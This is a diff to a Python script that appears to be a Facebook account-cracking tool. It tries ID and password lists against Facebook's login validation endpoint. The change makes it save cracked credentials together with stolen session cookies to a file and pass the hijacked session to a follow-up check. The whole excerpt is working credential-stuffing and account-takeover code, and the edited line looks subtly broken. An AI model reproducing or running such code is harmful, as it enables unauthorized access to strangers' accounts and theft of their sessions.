@@ -947,16 +947,11 @@ def ffb(ids,names,passlist):
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
-				try:
-                    coki = []
-                    for x in q['session_cookies']:
-                        coki.append(x['name']+'='+x['value']+';')
-                    cokie = coki[3]+coki[2]+coki[0]+coki[1]
-                    try:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+' | '+coki+'\n')
+				cek_apk(session,coki)
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
